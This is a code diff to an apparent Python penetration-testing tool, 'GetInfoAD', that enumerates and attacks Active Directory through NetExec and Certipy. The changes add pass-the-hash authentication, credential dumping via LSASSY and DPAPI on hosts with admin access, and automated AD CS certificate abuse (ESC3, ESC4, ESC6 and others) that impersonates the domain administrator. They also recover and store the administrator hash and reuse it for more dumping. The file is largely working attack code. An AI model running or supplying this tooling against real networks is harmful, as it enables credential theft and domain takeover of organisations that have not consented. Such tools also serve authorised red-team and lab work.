@@ -1,3 +1,5 @@
+import pyfiglet
+from termcolor import colored
 import os
 import subprocess
 import sys
@@ -273,9 +275,6 @@ install_termcolor_if_missing()
 install_pyfiglet_if_missing()
 install_requests_if_missing()
 
-from termcolor import colored
-import pyfiglet
-
 def validate_ip(ip):
     """Validates and processes an IP address that may include a /24 mask"""
     if not ip:
@@ -325,7 +324,7 @@ def show_banner():
     text_lines = figlet.renderText('GetInfoAD').rstrip().split('\n')
     for line in text_lines:
         print(colored("║", "cyan") + colored(f"{line:^62}", "green") + colored("║", "cyan"))
-    print(colored("╠══════════════════════════ V1 ════════════════════════════════╣", "cyan"))
+    print(colored("╠══════════════════════════ V1.0 ══════════════════════════════╣", "cyan"))
     title = "Active Directory Enumeration"  
     print(colored("║", "cyan") + colored(f"{title:^62}", "blue", attrs=["bold"]) + colored("║", "cyan"))
     print(colored("╠══════════════════════════════════════════════════════════════╣", "cyan"))
@@ -365,9 +364,18 @@ def show_env(env):
         else:
             if key == "IP":
                 display = colored("❌", "red") + colored(f" {key} is not defined or is not a valid IP address", "red")
+            elif key == "PASSWORD" and os.getenv("NT_HASH"):
+                continue  # Skip PASSWORD error if NT_HASH is defined
             else:
                 display = colored("❌", "red") + colored(f" {key} is not defined", "red")
         print("   " + display)
+    
+    if os.getenv("NT_HASH"):
+        print(colored("   🔐 Authentication: Using NT Hash", "green"))
+    elif os.getenv("PASSWORD"):
+        print(colored("   🔐 Authentication: Using Password", "green"))
+    else:
+        print(colored("   ❌ No authentication method defined", "red"))
     print()
 
 def generate_network_ips(base_ip):
@@ -403,9 +411,19 @@ def run_command(command, use_network=False, use_dc=False):
                     f.write("\n")
                 f.write(f"{'='*80}\n")
         
+        auth_type = "H" if os.getenv("NT_HASH") else "p"
+        auth_value = os.getenv("NT_HASH") if auth_type == "H" else os.getenv("PASSWORD")
+        
+        if auth_type == "H" and ":" in auth_value:
+            auth_value = auth_value.split(":")[1]
+        
         if use_dc and os.getenv("DC_IP"):
             dc_ip = os.getenv("DC_IP")
             current_command = command.replace("$IP", dc_ip)
+            if auth_type == "H":
+                current_command = current_command.replace("-p $PASSWORD", f"-H {auth_value}")
+            else:
+                current_command = current_command.replace("$PASSWORD", auth_value)
             if DEBUG:
                 print(colored(f"🔍 Command (DC): {current_command}", "yellow"))
             result = subprocess.run(current_command, shell=True, executable="/bin/bash", check=True, capture_output=True, text=True)
@@ -424,6 +442,10 @@ def run_command(command, use_network=False, use_dc=False):
             all_results = []
             for ip in network_ips:
                 current_command = command.replace("$IP", ip)
+                if auth_type == "H":
+                    current_command = current_command.replace("-p $PASSWORD", f"-H {auth_value}")
+                else:
+                    current_command = current_command.replace("$PASSWORD", auth_value)
                 print(colored(f"▶️  Running on {ip}...", "cyan"))
                 if DEBUG:
                     print(colored(f"🔍 Command: {current_command}", "yellow"))
@@ -439,10 +461,15 @@ def run_command(command, use_network=False, use_dc=False):
             return all_results
         
         else:
+            current_command = command.replace("$IP", os.getenv("IP"))
+            if auth_type == "H":
+                current_command = current_command.replace("-p $PASSWORD", f"-H {auth_value}")
+            else:
+                current_command = current_command.replace("$PASSWORD", auth_value)
             if DEBUG:
-                print(colored(f"🔍 Command: {command}", "yellow"))
-            result = subprocess.run(command, shell=True, executable="/bin/bash", check=True, capture_output=True, text=True)
-            log_command(command, result.stdout, result.stderr)
+                print(colored(f"🔍 Command: {current_command}", "yellow"))
+            result = subprocess.run(current_command, shell=True, executable="/bin/bash", check=True, capture_output=True, text=True)
+            log_command(current_command, result.stdout, result.stderr)
             if DEBUG:
                 print(colored("📤 Output:", "yellow"))
                 print(result.stdout)
@@ -450,11 +477,15 @@ def run_command(command, use_network=False, use_dc=False):
                     print(colored("📤 Error:", "red"))
                     print(result.stderr)
             return result.stdout.strip().splitlines()
-    
+            
     except subprocess.CalledProcessError as e:
         error_msg = f"❌ Command failed: {command}\n{e.stderr.strip()}"
         print(colored(error_msg, "red"))
         log_command(command, None, error_msg)
+        return []
+    except Exception as e:
+        error_msg = f"❌ Unexpected error: {str(e)}"
+        print(colored(error_msg, "red"))
         return []
 
 def ask_to_save(data, default_name):
@@ -496,17 +527,39 @@ def get_machines(with_versions=False):
                     print(colored("="*50 + "\n", "red"))
             
             if with_versions:
-                os_match = re.search(r'\[\*\] (.*?) \(name:', line)
-                if os_match:
-                    os_info = os_match.group(1).strip()
-                    hosts[hostname] = os_info
+                if "Windows" in line:
+                    if "Server" in line:
+                        os_info = re.search(r'Windows Server (\d{4})', line)
+                        if os_info:
+                            hosts[hostname] = f"Windows Server {os_info.group(1)}"
+                        else:
+                            hosts[hostname] = "Windows Server"
+                    else:
+                        os_info = re.search(r'Windows (\d+)', line)
+                        if os_info:
+                            hosts[hostname] = f"Windows {os_info.group(1)}"
+                        else:
+                            hosts[hostname] = "Windows"
+                elif "Unix" in line or "Samba" in line:
+                    hosts[hostname] = "Unix/Linux"
                 else:
                     hosts[hostname] = "Unknown OS"
             else:
                 hosts[hostname] = None
     
+    if with_versions:
+        ldap_command = '''nxc ldap $IP -u $USER -p $PASSWORD --groups'''
+        ldap_lines = run_command(ldap_command, use_network=False, use_dc=True)
+        for line in ldap_lines:
+            if "Windows" in line:
+                os_match = re.search(r'Windows (?:10|Server \d{4})', line)
+                if os_match:
+                    hostname = line.split('(name:')[1].split(')')[0]
+                    if hostname not in hosts or hosts[hostname] == "Unknown OS":
+                        hosts[hostname] = os_match.group(0)
+    
     if admin_hosts and not with_versions:
-        print(colored(f"\n🎯 Found {len(admin_hosts)} host(s) with admin access. Starting privilege escalation checks...", "yellow"))
+        print(colored(f"\n🎯 Found {len(admin_hosts)} host(s) with admin access.", "yellow"))
         
         for admin_ip, hostname in admin_hosts:
             print(colored(f"\n{'='*50}", "cyan"))
@@ -515,7 +568,12 @@ def get_machines(with_versions=False):
             
             admin_results[hostname] = {"ip": admin_ip, "lsassy": [], "dpapi": []}
             
-            print(colored("\n📊 Running LSASSY dump...", "yellow"))
+             
+            choice = input(colored("\n🔍 Do you want try dump password on this host? (y/N) > ", "yellow")).strip().lower()
+            if choice != 'y':
+                continue
+            
+            print(colored("\n📊 Running dump...", "yellow"))
             lsassy_command = f'''nxc smb {admin_ip} -u $USER -p $PASSWORD -M lsassy'''
             lsassy_results = run_command(lsassy_command)
             
@@ -527,9 +585,9 @@ def get_machines(with_versions=False):
                     admin_results[hostname]["lsassy"].append(line.strip())
             
             if not found_creds:
-                print(colored("  ℹ️  No credentials found with LSASSY", "yellow"))
+                print(colored("  ℹ️  No credentials found ", "yellow"))
             
-            print(colored("\n🔐 Running DPAPI check...", "yellow"))
+            print(colored("\n🔐 Running dump ...", "yellow"))
             dpapi_command = f'''nxc smb {admin_ip} -u $USER -p $PASSWORD --dpapi'''
             dpapi_results = run_command(dpapi_command)
             
@@ -561,7 +619,7 @@ def get_groups():
 
 def get_loggedon_users():
     command = '''nxc smb $IP -u $USER -p $PASSWORD --loggedon-users'''
-    lines = run_command(command, use_network=True)
+    lines = run_command(command, use_network=False, use_dc=True)  # On utilise uniquement le DC
     sessions = defaultdict(lambda: {"ip": "", "users": []})
     
     for line in lines:
@@ -597,16 +655,19 @@ def get_loggedon_users():
 
 def get_interfaces():
     command = '''nxc smb $IP -u $USER -p $PASSWORD --interfaces'''
-    lines = run_command(command, use_network=True)
+    lines = run_command(command, use_network=True, use_dc=False)  # On utilise toutes les cibles
     parsed = []
     seen = set()
     for line in lines:
         match = re.search(r'(Ethernet\d+)\s+\|\s+([\d.]+)\s+\|\s+(.*?)\s+\|\s+(.*?)\s+\|\s+(True|False)', line)
         if match:
-            entry = f"{match.group(1)} - {match.group(2)}  | Mask: {match.group(3)}  | Gateway: {match.group(4)}  | DHCP: {match.group(5)}"
-            if entry not in seen:
-                parsed.append(entry)
-                seen.add(entry)
+            host_match = re.search(r'SMB\s+(\d+\.\d+\.\d+\.\d+)\s+\d+\s+(\S+)', line)
+            if host_match:
+                host = host_match.group(2)
+                entry = f"{host} - {match.group(1)} - {match.group(2)}  | Mask: {match.group(3)}  | Gateway: {match.group(4)}  | DHCP: {match.group(5)}"
+                if entry not in seen:
+                    parsed.append(entry)
+                    seen.add(entry)
     return parsed
 
 def get_passpol():
@@ -628,23 +689,28 @@ def get_domain_name():
     command = '''nxc smb $IP -u $USER -p $PASSWORD'''
     result = run_command(command, use_network=True)  # On all network IPs to find DC
     domain = "UnknownDomain.local"
-    dc_ip = None
+    dc_ips = []
+    dc_hostnames = []
     
     for line in result:
-        match_domain = re.search(r'\(domain:([^)]+)\)', line)
-        if match_domain:
-            domain = match_domain.group(1).strip()
-        
-        match_dc = re.search(r'SMB\s+(\d+\.\d+\.\d+\.\d+)\s+\d+\s+(DC\d*|DC)', line)
-        if match_dc and not dc_ip:
-            dc_ip = match_dc.group(1)
-            os.environ["DC_IP"] = dc_ip
-            if DEBUG:
-                print(colored(f"🔍 DC detected at IP address: {dc_ip}", "green"))
+        if "(domain:" in line and "DC" in line.upper():
+            match_domain = re.search(r'\(domain:([^)]+)\)', line)
+            if match_domain:
+                domain = match_domain.group(1).strip()
+                if domain:  # Ne pas utiliser un domaine vide
+                    match_dc = re.search(r'SMB\s+(\d+\.\d+\.\d+\.\d+)\s+\d+\s+(\S+)', line)
+                    if match_dc:
+                        dc_ip = match_dc.group(1)
+                        dc_hostname = match_dc.group(2)
+                        if dc_ip not in dc_ips:  # Éviter les doublons
+                            dc_ips.append(dc_ip)
+                            dc_hostnames.append(dc_hostname)
+                            os.environ["DC_IP"] = dc_ip
+                            if DEBUG:
+                                print(colored(f"🔍 DC detected at IP address: {dc_ip}", "green"))
+                            break  # On prend le premier DC valide trouvé
     
-    if dc_ip:
-        os.environ["DC_IP"] = dc_ip
-    else:
+    if not dc_ips:  # Si aucun DC n'a été trouvé
         os.environ["DC_IP"] = os.getenv("IP")
         if DEBUG:
             print(colored(f"⚠️  No DC found, using provided IP: {os.getenv('IP')}", "yellow"))
@@ -853,69 +919,121 @@ def ask_crack_hashes():
         print(colored("❌ Unexpected error during hashcat execution:", "red"), e)
 
 def try_exploit_esc(esc_number, ca_name=None, template_name=None):
-    if esc_number == "ESC6":
-        command = "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -upn administrator@{domain} -debug"
-    elif esc_number == "ESC3":
-        command = [
-            "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -debug -out cert.pfx",
-            "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -template User -on-behalf-of 'administrator@{domain}' -pfx cert.pfx -debug"
-        ]
-    elif esc_number == "ESC4":
-        command = [
-            "certipy template -u '{username}@{domain}' -p '{password}' -template '{template_name}' -save-old -debug",
-            "certipy template -u '{username}@{domain}' -p '{password}' -template '{template_name}' -configuration '{template_name}.json' -save-old -debug",
-            "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -upn administrator@{domain} -debug"
-        ]
-    elif esc_number in AUTOMATED_ESC_EXPLOITS:
-        command = "certipy req -u '{username}@{domain}' -p '{password}' -target-ip {dc_ip} -ca '{ca_name}' -template '{template_name}' -upn administrator@{domain} -debug"
-    else:
-        print(colored(f"❌ {esc_number} cannot be automatically exploited.", "red"))
-        return False
-
-    print(colored(f"\n🎯 Attempting to exploit {esc_number}", "cyan"))
-    if esc_number in ESC_VULNERABILITIES:
-        print(colored(f"Description: {ESC_VULNERABILITIES[esc_number]['description']}", "yellow"))
-
-    params = {
-        "username": os.getenv("USER"),
-        "password": os.getenv("PASSWORD"),
-        "dc_ip": os.getenv("DC_IP"),
-        "domain": get_domain_name(),
-        "ca_name": ca_name,
-        "template_name": template_name
-    }
-
     try:
-        if isinstance(command, list):
-            for cmd in command:
-                print(colored(f"\n🔄 Executing: {cmd.format(**params)}", "cyan"))
-                result = subprocess.run(cmd.format(**params), shell=True, capture_output=True, text=True)
+        auth_type = "H" if os.getenv("NT_HASH") else "p"
+        auth_value = os.getenv("NT_HASH") if auth_type == "H" else os.getenv("PASSWORD")
+        
+        domain = get_domain_name().upper()
+        
+        if esc_number == "ESC6":
+            command = f"certipy req -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -target-ip {{dc_ip}} -ca '{{ca_name}}' -upn administrator@{domain} -debug"
+        elif esc_number == "ESC3":
+            command = [
+                f"certipy req -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -target-ip {{dc_ip}} -ca '{{ca_name}}' -template '{{template_name}}' -debug -out cert.pfx",
+                f"certipy req -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -target-ip {{dc_ip}} -ca '{{ca_name}}' -template User -on-behalf-of 'administrator@{domain}' -pfx cert.pfx -debug"
+            ]
+        elif esc_number == "ESC4":
+            command = [
+                f"certipy template -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -template '{{template_name}}' -save-old -debug",
+                f"certipy template -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -template '{{template_name}}' -configuration '{{template_name}}.json' -save-old -debug",
+                f"certipy req -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -target-ip {{dc_ip}} -ca '{{ca_name}}' -template '{{template_name}}' -upn administrator@{domain} -debug"
+            ]
+        elif esc_number in AUTOMATED_ESC_EXPLOITS:
+            command = f"certipy req -u '{{username}}@{domain}' -{auth_type} '{auth_value}' -target-ip {{dc_ip}} -ca '{{ca_name}}' -template '{{template_name}}' -upn administrator@{domain} -debug"
+        else:
+            print(colored(f"❌ {esc_number} cannot be automatically exploited.", "red"))
+            return False
+
+        print(colored(f"\n🎯 Attempting to exploit {esc_number}", "cyan"))
+        if esc_number in ESC_VULNERABILITIES:
+            print(colored(f"Description: {ESC_VULNERABILITIES[esc_number]['description']}", "yellow"))
+
+        params = {
+            "username": os.getenv("USER"),
+            "password": auth_value if auth_type == "p" else None,
+            "nt_hash": auth_value if auth_type == "H" else None,
+            "dc_ip": os.getenv("DC_IP"),
+            "domain": domain,
+            "ca_name": ca_name,
+            "template_name": template_name
+        }
+
+        try:
+            if isinstance(command, list):
+                for cmd in command:
+                    print(colored(f"\n🔄 Executing: {cmd.format(**params)}", "cyan"))
+                    result = subprocess.run(cmd.format(**params), shell=True, capture_output=True, text=True)
+                    print(colored("\nOutput:", "yellow"))
+                    print(result.stdout)
+                    if result.stderr:
+                        print(colored("\nError:", "red"))
+                        print(result.stderr)
+                    if "Successfully requested certificate" in result.stdout or "Successfully updated" in result.stdout:
+                        print(colored("✅ Step completed successfully!", "green"))
+                    elif result.returncode != 0:
+                        print(colored("❌ Step failed!", "red"))
+                        return False
+            else:
+                print(colored(f"\n🔄 Executing: {command.format(**params)}", "cyan"))
+                result = subprocess.run(command.format(**params), shell=True, capture_output=True, text=True)
                 print(colored("\nOutput:", "yellow"))
                 print(result.stdout)
-                if result.stderr:
-                    print(colored("\nError:", "red"))
-                    print(result.stderr)
-                if "Successfully requested certificate" in result.stdout or "Successfully updated" in result.stdout:
-                    print(colored("✅ Step completed successfully!", "green"))
-                elif result.returncode != 0:
-                    print(colored("❌ Step failed!", "red"))
+                if "Successfully requested certificate" in result.stdout:
+                    print(colored("✅ Exploitation successful!", "green"))
+                    if os.path.exists("administrator.pfx"):
+                        hash_command = "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}".format(**params)
+                        hash_result = subprocess.run(hash_command, shell=True, capture_output=True, text=True)
+                        if "Got hash" in hash_result.stdout:
+                            try:
+                                hash_line = [line for line in hash_result.stdout.split('\n') if "Got hash" in line][0]
+                                hash_parts = hash_line.split(": ")[1].split(":")
+                                if len(hash_parts) >= 3:
+                                    hash_value = hash_parts[2]
+                                    with open("cracked_credentials.txt", "a") as f:
+                                        f.write(f"Administrator@{domain}:{hash_value}\n")
+                                    print(colored(f"✅ Hash saved: Administrator@{domain}:{hash_value}", "green"))
+                                    
+                                    choice = input(colored("\n🔍 Do you want to attempt additional password recovery? (y/N) > ", "yellow")).strip().lower()
+                                    if choice == 'y':
+                                        print(colored("\n🔄 Running DPAPI and LSASSY checks with new credentials...", "cyan"))
+                                        
+                                        dpapi_command = f"nxc smb {params['dc_ip']} -u Administrator -H {hash_value} --dpapi"
+                                        dpapi_result = subprocess.run(dpapi_command, shell=True, capture_output=True, text=True)
+                                        print(colored("\nDPAPI Results:", "yellow"))
+                                        print(dpapi_result.stdout)
+                                        if dpapi_result.stderr:
+                                            print(colored("DPAPI Errors:", "red"))
+                                            print(dpapi_result.stderr)
+                                        
+                                        lassy_command = f"nxc smb {params['dc_ip']} -u Administrator -H {hash_value} -M lsassy"
+                                        lassy_result = subprocess.run(lassy_command, shell=True, capture_output=True, text=True)
+                                        print(colored("\nLSASSY Results:", "yellow"))
+                                        print(lassy_result.stdout)
+                                        if lassy_result.stderr:
+                                            print(colored("LSASSY Errors:", "red"))
+                                            print(lassy_result.stderr)
+                                    else:
+                                        print(colored("🚫 Skipping additional password recovery.", "yellow"))
+                                else:
+                                    print(colored("❌ Could not extract hash from certificate", "red"))
+                            except IndexError:
+                                print(colored("❌ Could not find hash in certipy output", "red"))
+                            except Exception as e:
+                                print(colored(f"❌ Error processing hash: {str(e)}", "red"))
+                            
+                    return True
+                else:
+                    print(colored("❌ Exploitation failed!", "red"))
+                    if result.stderr:
+                        print(colored("\nError:", "red"))
+                        print(result.stderr)
                     return False
-        else:
-            print(colored(f"\n🔄 Executing: {command.format(**params)}", "cyan"))
-            result = subprocess.run(command.format(**params), shell=True, capture_output=True, text=True)
-            print(colored("\nOutput:", "yellow"))
-            print(result.stdout)
-            if "Successfully requested certificate" in result.stdout:
-                print(colored("✅ Exploitation successful!", "green"))
-                return True
-            else:
-                print(colored("❌ Exploitation failed!", "red"))
-                if result.stderr:
-                    print(colored("\nError:", "red"))
-                    print(result.stderr)
-                return False
 
-        return True
+            return True
+        except Exception as e:
+            print(colored(f"❌ Error during command execution: {str(e)}", "red"))
+            return False
+            
     except Exception as e:
         print(colored(f"❌ Error during exploitation: {str(e)}", "red"))
         return False
@@ -951,10 +1069,13 @@ def process_esc_vulnerabilities(adcs_info):
     }
     
     for line in adcs_info:
-        if "CA: " in line:
-            current_ca = line.split(": ")[1]
-        elif "Template: " in line:
-            current_template = line.split(": ")[1]
+        if "CA Name" in line:
+            current_ca = line.split(":")[1].strip()
+        elif "Template Name" in line:
+            current_template = line.split(":")[1].strip()
+        elif "[!] Vulnerabilities" in line:
+            # La prochaine ligne contient les vulnérabilités
+            continue
         elif any(esc in line for esc in AUTOMATED_ESC_EXPLOITS.keys()):
             esc_num = line.split(":")[0].strip()
             if esc_num in AUTOMATED_ESC_EXPLOITS:
@@ -974,7 +1095,7 @@ def process_esc_vulnerabilities(adcs_info):
                     }
     
     if detected_escs:
-        print(colored("\n🔍 Detected ESC vulnerabilities that can be automatically exploited:", "cyan"))
+        print(colored("\n🔍 Vulnérabilités ESC détectées pouvant être exploitées automatiquement :", "cyan"))
         for esc_num, info in detected_escs.items():
             params = {
                 "username": os.getenv("USER"),
@@ -994,15 +1115,18 @@ def process_esc_vulnerabilities(adcs_info):
                 if info["template_name"]:
                     print(f"  Template: {info['template_name']}")
                 
-                choice = input(colored(f"\n🎯 Would you like to attempt exploitation of {esc_num}? (y/N) > ", "cyan")).strip().lower()
+                choice = input(colored(f"\n🎯 Voulez-vous tenter l'exploitation de {esc_num} ? (y/N) > ", "cyan")).strip().lower()
                 if choice == 'y':
                     try_exploit_esc(esc_num, info["ca_name"], info["template_name"])
+            else:
+                print(colored(f"\n⚠️ {esc_num} ne peut pas être exploité automatiquement - Paramètres manquants : {', '.join(missing_params)}", "yellow"))
 
 def get_adcs_info():
     """Enumerate ADCS certificates using Certipy"""
     username = os.getenv("USER")
     password = os.getenv("PASSWORD")
     dc_ip = os.getenv("DC_IP")
+    nt_hash = os.getenv("NT_HASH")
     
     if not dc_ip:
         print(colored("❌ DC IP not found. Running domain discovery first...", "yellow"))
@@ -1014,120 +1138,41 @@ def get_adcs_info():
         return []
     
     output_file = "certipy_results.txt"
-    command = f'certipy find -vulnerable -u {username} -p "{password}" -dc-ip {dc_ip} -stdout 2>/dev/null | grep -v "Certipy v" > {output_file}'
+    error_file = "certipy_errors.txt"
+    
+    # Déterminer le type d'authentification
+    auth_type = "H" if nt_hash else "p"
+    auth_value = nt_hash if auth_type == "H" else password
+    
+    # Construire la commande en fonction du type d'authentification
+    if auth_type == "H":
+        command = f'certipy find -vulnerable -u {username} -hashes {auth_value} -dc-ip {dc_ip} -stdout > {output_file} 2>{error_file}'
+    else:
+        command = f'certipy find -vulnerable -u {username} -p "{auth_value}" -dc-ip {dc_ip} -stdout > {output_file} 2>{error_file}'
     
     try:
-        subprocess.run(command, shell=True, check=True)
+        print(colored(f"🔍 Running Certipy command: {command}", "yellow"))
+        result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True)
+        
         vulns = []
         
         if os.path.exists(output_file):
             with open(output_file, 'r') as f:
                 lines = f.readlines()
             
-            current_section = None
-            current_template = None
-            seen_users = set()
+            if not lines:
+                print(colored("⚠️ No output from Certipy scan", "yellow"))
+                return ["No results from Certipy scan"]
             
-            for line in lines:
-                line = line.strip()
-                if not line or line.startswith("[*]"):
-                    continue
-                
-                if line == "Certificate Authorities":
-                    current_section = "CA"
-                    vulns.append("_[Certificate Authorities]_")
-                    continue
-                elif line == "Certificate Templates":
-                    current_section = "Templates"
-                    vulns.append("\n_[Certificate Templates]_")
-                    continue
-                
-                if current_section == "CA":
-                    if "CA Name" in line:
-                        vulns.append(f"CA: {line.split(': ')[1]}")
-                    elif "DNS Name" in line:
-                        vulns.append(f"DNS: {line.split(': ')[1]}")
-                    elif "Certificate Subject" in line:
-                        vulns.append(f"Subject: {line.split(': ')[1]}")
-                    elif "Web Enrollment" in line:
-                        vulns.append(f"Web Enrollment: {line.split(': ')[1]}")
-                    elif "User Specified SAN" in line:
-                        vulns.append(f"User Specified SAN: {line.split(': ')[1]}")
-                    elif "Permissions" in line:
-                        vulns.append("\n_[Permissions]_")
-                    elif "Access Rights" in line:
-                        vulns.append("Access Rights:")
-                        seen_users.clear()
-                    elif line.startswith("LAB.LOCAL\\"):
-                        if line not in seen_users:
-                            vulns.append(f"• {line}")
-                            seen_users.add(line)
-                    elif line.startswith("[!] Vulnerabilities"):
-                        vulns.append("\n_[Vulnerabilities]_")
-                    elif any(esc in line for esc in ["ESC1", "ESC2", "ESC3", "ESC4", "ESC5", "ESC6", "ESC7", "ESC8", "ESC9", "ESC10", "ESC11"]):
-                        if ": " in line:
-                            esc_num, desc = line.split(": ", 1)
-                            esc_num = esc_num.strip()
-                            desc = desc.strip()
-                            vulns.append(f"{esc_num}: {desc}")
-                            if esc_num in ESC_VULNERABILITIES:
-                                esc_info = ESC_VULNERABILITIES[esc_num]
-                                vulns.append(f"📖 Documentation: {esc_info['link']}")
-                                vulns.append(f"💡 Exploitation: {esc_info['description']}")
-                
-                elif current_section == "Templates":
-                    if "Template Name" in line:
-                        current_template = line.split(": ")[1]
-                        vulns.append(f"\nTemplate: {current_template}")
-                        seen_users.clear()
-                    elif "Display Name" in line:
-                        vulns.append(f"Name: {line.split(': ')[1]}")
-                    elif "Enabled" in line and ": True" in line:
-                        vulns.append("Status: Enabled")
-                    elif "Client Authentication" in line:
-                        vulns.append(f"Client Auth: {line.split(': ')[1]}")
-                    elif "Enrollment Flag" in line and ":" in line:
-                        flags = line.split(":", 1)[1].strip()
-                        if flags:
-                            vulns.append("_[Enrollment Flags]_")
-                            for flag in flags.split():
-                                vulns.append(f"• {flag}")
-                    elif "Private Key Flag" in line and ":" in line:
-                        flags = line.split(":", 1)[1].strip()
-                        if flags:
-                            vulns.append("_[Private Key Flags]_")
-                            for flag in flags.split():
-                                vulns.append(f"• {flag}")
-                    elif "Extended Key Usage" in line and ":" in line:
-                        usage = line.split(":", 1)[1].strip()
-                        if usage:
-                            vulns.append("_[Extended Key Usage]_")
-                            for use in usage.split(","):
-                                vulns.append(f"• {use.strip()}")
-                    elif "Enrollment Rights" in line:
-                        vulns.append("_[Enrollment Rights]_")
-                        seen_users.clear()
-                    elif line.startswith("LAB.LOCAL\\"):
-                        if line not in seen_users:
-                            vulns.append(f"• {line}")
-                            seen_users.add(line)
-                    elif line.startswith("[!] Vulnerabilities"):
-                        vulns.append("\n_[Vulnerabilities]_")
-                    elif any(esc in line for esc in ["ESC1", "ESC2", "ESC3", "ESC4", "ESC5", "ESC6", "ESC7", "ESC8", "ESC9", "ESC10", "ESC11"]):
-                        if ": " in line:
-                            esc_num, desc = line.split(": ", 1)
-                            esc_num = esc_num.strip()
-                            desc = desc.strip()
-                            vulns.append(f"{esc_num}: {desc}")
-                            if esc_num in ESC_VULNERABILITIES:
-                                esc_info = ESC_VULNERABILITIES[esc_num]
-                                vulns.append(f"📖 Documentation: {esc_info['link']}")
-                                vulns.append(f"💡 Exploitation: {esc_info['description']}")
+            vulns.extend([line.strip() for line in lines if line.strip()])
             
-        if vulns:
             process_esc_vulnerabilities(vulns)
-        
-        return vulns
+            
+            return vulns
+        else:
+            print(colored("❌ Certipy output file not found", "red"))
+            return ["Certipy output file not found"]
+            
     except subprocess.CalledProcessError as e:
         print(colored(f"❌ Error running Certipy: {e}", "red"))
         return ["Error running Certipy scan"]
@@ -1354,6 +1399,7 @@ def update_hosts_file():
     if not dc_ip or not domain:
         return
 
+    dc_ip = dc_ip.split('/')[0]
     hosts_entry = f"{dc_ip} {domain}"
 
     try:
@@ -1372,7 +1418,7 @@ def update_hosts_file():
 
 def get_users():
     command = '''nxc ldap $IP -u $USER -p $PASSWORD --users'''
-    lines = run_command(command, use_network=False, use_dc=True)
+    lines = run_command(command, use_network=False, use_dc=True)  # On utilise uniquement le DC
     users = []
     for line in lines:
         if (
@@ -1400,47 +1446,47 @@ def main():
     
     parser.add_argument("-d", "--debug", action="store_true", help="Enable debug mode to show all commands and outputs")
     parser.add_argument("--no-update-check", action="store_true", help="Skip update check")
-
+    
     args = parser.parse_args()
-
+    
     global DEBUG
     DEBUG = args.debug
-
+    
     if not args.no_update_check:
         check_for_updates()
-
+    
     banner()
     env = check_env_vars()
     show_env(env)
-
+    
     if None in env.values():
         print(colored("💡 Please define all required environment variables before running this script.", "yellow", attrs=["bold"]))
         print(colored("Example: exegol-history add creds -u 'MyUser' -p 'Password123' ; exegol-history apply creds", "cyan"))
         sys.exit(1)
     
     update_hosts_file()
-
+    
     if DEBUG:
         print(colored("🔧 Debug mode enabled - Displaying all commands and outputs", "yellow", attrs=["bold"]))
         print()
-
+    
     if not any([args.users, args.machines, args.os, args.full, args.groups, args.kerberstable, args.asreprostable]):
         args.full = True
-
+    
     if args.users:
         results = get_users()
         print("\n".join(results))
         ask_to_save(results, "users.txt")
-
+    
     elif args.kerberstable:
-        results = get_kerberost()  # No need for specific user
+        results = get_kerberost()
         if results:
             print("\n".join(results))
             ask_crack_kerberos_hashes()
         else:
             print(colored("No Kerberos roastable account found.", "yellow"))
             ask_to_save(results if results else ["No Kerberos roastable account found."], "kerberost.txt")
-
+    
     elif args.asreprostable:
         users = get_users()
         results = get_asreproast(users)
@@ -1450,23 +1496,23 @@ def main():
         else:
             print(colored("No AS-REP roastable account found.", "yellow"))
             ask_to_save(results if results else ["No AS-REP roastable account found."], "asreproast.txt")
-
+    
     elif args.machines:
         results = get_machines()
         print("\n".join(results.keys()))
         ask_to_save(list(results.keys()), "machines.txt")
-
+    
     elif args.os:
         results = get_machines(with_versions=True)
         output = [f"{host} — {osinfo}" for host, osinfo in results[0].items()]
         print("\n".join(output))
         ask_to_save(output, "machines_with_os.txt")
-
+    
     elif args.groups:
         results = get_groups()
         print("\n".join(results))
         ask_to_save(results, "groups.txt")
-
+    
     elif args.full:
         full_report()
 
